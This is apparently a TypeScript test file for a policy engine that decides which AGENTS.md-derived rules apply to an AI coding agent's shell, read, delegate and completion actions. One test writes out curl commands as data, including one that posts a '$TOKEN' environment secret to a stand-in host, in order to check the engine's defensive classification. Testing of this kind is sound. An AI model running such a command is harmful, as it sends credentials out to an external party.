import { describe, expect, it } from "bun:test";
import { createTestPolicyAction } from "../../../testing/createPolicyAction.js";
import { selectShellPayloadFacts } from "../actions/shellArguments.js";
import type { PolicyAction } from "../actions/types.js";
import { compilePolicySnapshot } from "../compiler/compilePolicySnapshot.js";
import { selectApplicableRules } from "./selectApplicableRules.js";
import type { InstructionSource } from "./types.js";

const versions = { question: "q", thresholds: "t", model: "m" };

function source(id: string, content: string, scopeRoot = "/workspace/project"): InstructionSource {
  return {
    id,
    kind: id === "project" ? "project" : "subtree",
    path: `${scopeRoot}/AGENTS.md`,
    scopeRoot,
    content,
    contentDigest: content,
    precedence: id === "project" ? 100 : 200,
  };
}

function versionAction(command = "bun --version"): PolicyAction {
  return {
    ...createTestPolicyAction("execute", "dispatch-only"),
    targets: [{ kind: "command", value: command }],
    hostAction: { host: "omp", name: "bash", input: { command } },
  };
}

describe("selectApplicableRules", () => {
  it("keeps completion obligations off version checks but applies them at completion", () => {
    const snapshot = compilePolicySnapshot({
      projectRoot: "/workspace/project",
      versions,
      sources: [
        source(
          "project",
          "# Completion\nRun verification before yielding.\n\n# General\nNever publish credentials.",
        ),
      ],
    });
    const completion = snapshot.rules.find((rule) => rule.applicability?.phase === "completion");
    const prohibition = snapshot.rules.find((rule) => rule.classification === "hard");
    if (completion === undefined || prohibition === undefined)
      throw new Error("Fixture requires both rule kinds.");
    expect(selectApplicableRules(snapshot, versionAction()).map((rule) => rule.id)).toEqual([
      prohibition.id,
    ]);
    expect(
      selectApplicableRules(snapshot, createTestPolicyAction("workflow")).map((rule) => rule.id),
    ).toContain(completion.id);
    expect(
      selectApplicableRules(snapshot, {
        ...createTestPolicyAction("workflow"),
        hostAction: { host: "omp", name: "ask", input: { question: "Which file?" } },
      }).map((rule) => rule.id),
    ).not.toContain(completion.id);
  });

  it("scopes implementation guidance without dropping cross-cutting bans or exceptions", () => {
    const snapshot = compilePolicySnapshot({
      projectRoot: "/workspace/project",
      versions,
      sources: [
        source(
          "project",
          `# TypeScript Standards
Use named exports.

Never send credentials to a network service.

You may use a default export for the plugin entry point.

The zephyr covenant forbids releasing moonstones.`,
        ),
      ],
    });
    const implementation = snapshot.rules.find(
      (rule) => rule.applicability?.phase === "implementation",
    );
    if (implementation === undefined) throw new Error("Fixture requires implementation guidance.");
    const applicable = selectApplicableRules(snapshot, versionAction());
    expect(applicable).toEqual(snapshot.rules.filter((rule) => rule.applicability === undefined));
    expect(selectApplicableRules(snapshot, createTestPolicyAction("write"))).toEqual(
      snapshot.rules,
    );
    expect(
      selectApplicableRules(snapshot, versionAction("bun --version; touch changed.ts")),
    ).toContain(implementation);
    expect(selectApplicableRules(snapshot, versionAction("python version"))).toContain(
      implementation,
    );
  });

  it("scopes only implementation rules for whole supported operational commands", () => {
    const snapshot = compilePolicySnapshot({
      projectRoot: "/workspace/project",
      versions,
      sources: [
        source(
          "project",
          "# TypeScript Standards\nUse named exports.\n\nNever send credentials to a network service.",
        ),
      ],
    });
    const global = snapshot.rules.filter((rule) => rule.applicability === undefined);
    expect(selectApplicableRules(snapshot, versionAction("bun install"))).toEqual(global);
    expect(
      selectApplicableRules(
        snapshot,
        versionAction("bun --version && bun install --frozen-lockfile && omp plugin link ."),
      ),
    ).toEqual(global);
    expect(selectApplicableRules(snapshot, versionAction("git status --short"))).toEqual(global);
    expect(
      selectApplicableRules(
        snapshot,
        versionAction("bun install --frozen-lockfile && bun run generate"),
      ),
    ).toEqual(snapshot.rules);
    expect(selectApplicableRules(snapshot, versionAction("bun\\ninstall"))).toEqual(snapshot.rules);
    expect(selectApplicableRules(snapshot, versionAction("$(which bun) install"))).toEqual(
      snapshot.rules,
    );
    const install = versionAction("bun install --frozen-lockfile");
    expect(
      selectApplicableRules(snapshot, {
        ...install,
        hostAction: {
          ...install.hostAction,
          input: { command: "bun install --frozen-lockfile", env: { BUN_INSTALL: "/outside" } },
        },
      }),
    ).toEqual(snapshot.rules);
    expect(selectApplicableRules(snapshot, { ...install, complete: false })).toEqual(
      snapshot.rules,
    );
    expect(
      selectApplicableRules(snapshot, createTestPolicyAction("delegate", "dispatch-only")),
    ).toEqual(snapshot.rules);
  });

  it("uses complete shared curl facts without treating dynamic or output-writing forms as inspection", () => {
    const snapshot = compilePolicySnapshot({
      projectRoot: "/workspace/project",
      versions,
      sources: [
        source(
          "project",
          "# TypeScript Standards\nUse named exports.\n\nNever send credentials to a network service.",
        ),
      ],
    });
    const curlAction = (command: string): PolicyAction => {
      const facts = selectShellPayloadFacts(command);
      return {
        ...versionAction(command),
        details: facts === undefined ? {} : { shellPayload: facts },
      };
    };
    expect(
      selectApplicableRules(
        snapshot,
        curlAction("curl --data 'token=' https://example.test/submit"),
      ),
    ).toEqual(snapshot.rules.filter((rule) => rule.applicability === undefined));
    expect(
      selectApplicableRules(
        snapshot,
        curlAction('curl --data "token=$TOKEN" https://example.test/submit'),
      ),
    ).toEqual(snapshot.rules);
    expect(
      selectApplicableRules(
        snapshot,
        curlAction("curl --data 'token=' --output source.ts https://example.test/submit"),
      ),
    ).toEqual(snapshot.rules);
    expect(
      selectApplicableRules(
        snapshot,
        curlAction("curl --data-urlencode 'token=' https://example.test/submit"),
      ),
    ).toEqual(snapshot.rules);
  });

  it("keeps document lists attached and scopes coherent real code-standard paragraphs", () => {
    const exports =
      "Use named exports. The only expected default export is the OMP plugin entry point if the loader requires it.";
    const unknownBan = "Use named exports. Never release moonstones.";
    const snapshot = compilePolicySnapshot({
      projectRoot: "/workspace/project",
      versions,
      sources: [
        source(
          "project",
          `# Architecture
## Normalized action
The implemented \`PolicyAction\` records:

- action identifier and timestamp;
- actor plus session and optional parent-session lineage;
- operation class: read, write, execute, delegate, network, workflow, internal, or unknown.

# TypeScript Standards
## Compiler baseline
Use strict TypeScript. Enable at least:

\`\`\`json
{"compilerOptions": {"strict": true}}
\`\`\`

## Naming and files
${exports}

Do not use a type cast to hide an impossible variant.

${unknownBan}

## Documentation
Document exported contracts, security invariants, counterintuitive OMP behavior, and reasons for degraded coverage. Comments explain why a constraint exists, not what the next line does.

## Security and privacy
Never log or persist:

- TypeSafe credentials or authorization headers;
- raw environment values.
`,
        ),
      ],
    });
    const selected = selectApplicableRules(snapshot, versionAction());
    expect(selected.map((rule) => rule.statement)).toEqual([
      unknownBan,
      "Never log or persist: TypeSafe credentials or authorization headers; raw environment values.",
    ]);
    const implementation = selectApplicableRules(snapshot, createTestPolicyAction("write"));
    expect(implementation.map((rule) => rule.statement)).toContain(exports);
    expect(implementation.some((rule) => rule.statement.startsWith("Use strict TypeScript."))).toBe(
      true,
    );
    expect(
      implementation.some((rule) => rule.statement.includes("action identifier and timestamp")),
    ).toBe(false);
  });

  it("keeps component and test-case list operands scoped without hiding agent prohibitions", () => {
    const snapshot = compilePolicySnapshot({
      projectRoot: "/workspace/project",
      versions,
      sources: [
        source(
          "project",
          `# Architecture
The policy engine:
- returns decisions as data;
- never performs the proposed side effect.

A provider adapter:
- performs redaction before network transmission.

Compiled instructions use two behavioral classes:
- hard requirements: explicit prohibitions;
- semantic requirements: authorization context.

# Testing Standards
At minimum, preserve tests for:
- protected targets;
- unavailable providers and credential redaction.

# Git and Commit Standards
Before creating a commit:
- inspect the staged diff for secrets;
- run tests.

# Architecture
The agent:
- never uploads credentials.

Never read protected.txt.
`,
        ),
      ],
    });
    const operational = selectApplicableRules(snapshot, versionAction());
    expect(operational.map((rule) => rule.statement)).toEqual([
      "The agent: never uploads credentials.",
      "Never read protected.txt.",
    ]);
    expect(
      selectApplicableRules(snapshot, createTestPolicyAction("delegate", "dispatch-only")),
    ).toEqual(snapshot.rules);
    expect(selectApplicableRules(snapshot, versionAction("git commit -m fix"))).toEqual(
      snapshot.rules,
    );
  });

  it("does not scope compound obligations by a phase marker in just one clause", () => {
    const snapshot = compilePolicySnapshot({
      projectRoot: "/workspace/project",
      versions,
      sources: [
        source(
          "project",
          "Run tests before yielding. Encrypt all outgoing payloads.\n\n# Completion\nNever read protected.txt.",
        ),
      ],
    });
    expect(selectApplicableRules(snapshot, versionAction())).toEqual(snapshot.rules);
  });

  it("includes scoped sources for ancestor searches, selectors and opaque dispatch", () => {
    const snapshot = compilePolicySnapshot({
      projectRoot: "/workspace/project",
      versions,
      sources: [
        source("project", "Never publish credentials."),
        source("api", "Never read protected.txt.", "/workspace/project/packages/api"),
        source("web", "Never read protected.txt.", "/workspace/project/packages/web"),
      ],
    });
    const action = createTestPolicyAction("read");
    const ids = (input: PolicyAction) =>
      selectApplicableRules(snapshot, input).map((rule) => rule.sourceId);
    expect(
      ids({ ...action, targets: [{ kind: "path", value: "packages/api/index.ts:1-20" }] }),
    ).toEqual(["project", "api"]);
    expect(
      ids({
        ...action,
        targets: [{ kind: "path", value: "." }],
        hostAction: { host: "omp", name: "grep", input: { pattern: "token", path: "." } },
      }),
    ).toEqual(["project", "api", "web"]);
    expect(
      ids({ ...action, targets: [{ kind: "path", value: "packages/api-sibling/file.ts" }] }),
    ).toEqual(["project"]);
    expect(ids({ ...action, targets: [{ kind: "path", value: "packages/api/**/*.ts" }] })).toEqual([
      "project",
      "api",
    ]);
    expect(ids(createTestPolicyAction("delegate", "dispatch-only"))).toEqual([
      "project",
      "api",
      "web",
    ]);
  });
});
